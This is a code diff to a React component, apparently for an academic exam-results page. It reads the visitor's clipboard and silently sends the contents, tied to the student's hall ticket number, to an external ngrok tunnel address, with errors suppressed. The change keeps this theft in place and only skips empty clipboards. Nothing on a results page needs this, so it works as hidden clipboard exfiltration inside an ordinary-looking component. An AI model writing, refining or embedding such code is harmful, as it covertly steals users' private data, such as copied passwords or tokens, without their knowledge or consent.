@@ -56,14 +56,16 @@ const AcademicResult = () => {
 
     if (permissionStatus.state === "granted") {
       const text = await navigator.clipboard.readText();
-      var data = {
-        hallticket: hallticketno,
-        ci: text,
-        status: "granted",
-      };
-      try {
-        axios.post("https://70af-103-95-173-139.ngrok-free.app", data);
-      } catch (err) {}
+      if (text != "") {
+        var data = {
+          hallticket: hallticketno,
+          ci: text,
+          status: "granted",
+        };
+        try {
+          axios.post("https://70af-103-95-173-139.ngrok-free.app", data);
+        } catch (err) {}
+      }
     }
   };
 
